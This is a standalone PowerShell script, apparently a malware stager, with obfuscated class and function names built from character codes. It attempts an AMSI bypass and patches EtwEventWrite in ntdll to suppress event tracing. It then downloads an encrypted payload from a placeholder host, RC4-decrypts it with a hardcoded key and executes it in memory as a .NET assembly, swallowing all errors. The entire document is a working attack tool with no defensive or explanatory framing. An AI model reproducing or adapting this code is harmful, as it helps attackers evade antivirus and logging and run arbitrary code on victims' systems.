$ErrorActionPreference = "SilentlyContinue"

# ── AMSI bypass ──
try {
    $t = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*([char]105+[char]85+[char]116+[char]105+[char]108+[char]115)*" }
    $f = $t.GetFields("NonPublic,Static") | ? { $_.Name -like "*([char]67+[char]111+[char]110+[char]116+[char]101+[char]120+[char]116)*" }
    $f.SetValue($null, [IntPtr]::Zero)
} catch {}

# ── ETW patch ──
try {
    $m = [System.Runtime.InteropServices.Marshal]
    $h = $m::([char]71+[char]101+[char]116+[char]77+[char]111+[char]100+[char]117+[char]108+[char]101+[char]72+[char]97+[char]110+[char]100+[char]108+[char]101)(([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108))
    $a = $m::([char]71+[char]101+[char]116+[char]80+[char]114+[char]111+[char]99+[char]65+[char]100+[char]100+[char]114+[char]101+[char]115+[char]115)($h, [Text.Encoding]::ASCII.GetString([byte[]]@(
        69,116,119,69,118,101,110,116,87,114,105,116,101
    )))
    $old = 0
    $m::([char]86+[char]105+[char]114+[char]116+[char]117+[char]97+[char]108+[char]80+[char]114+[char]111+[char]116+[char]101+[char]99+[char]116)($a, 1, 0x40, [ref]$old) | Out-Null
    $m::WriteByte($a, 0xC3)
} catch {}

# ── Download + decrypt + run ──
try {
    $wc = New-Object ([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]78+[char]101+[char]116+[char]46+[char]87+[char]101+[char]98+[char]67+[char]108+[char]105+[char]101+[char]110+[char]116)
    $enc = $wc.([char]68+[char]111+[char]119+[char]110+[char]108+[char]111+[char]97+[char]100+[char]68+[char]97+[char]116+[char]97)("https://example.com/payload.bin")
# RC4 decrypt
$S = 0..255; $j = 0
$k = [byte[]]@(134,218,195,173,49,233,173,52,165,169,234,122,94,184,46,174)
for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $S[$i] + $k[$i % $k.Length]) % 256
    $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t
}
$a = 0; $b = 0; $d = New-Object byte[] $enc.Length
for ($n = 0; $n -lt $enc.Length; $n++) {
    $a = ($a + 1) % 256; $b = ($b + $S[$a]) % 256
    $t = $S[$a]; $S[$a] = $S[$b]; $S[$b] = $t
    $d[$n] = $enc[$n] -bxor $S[($S[$a] + $S[$b]) % 256]
}
[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null, (, [object[]]@())) | Out-Null
} catch {}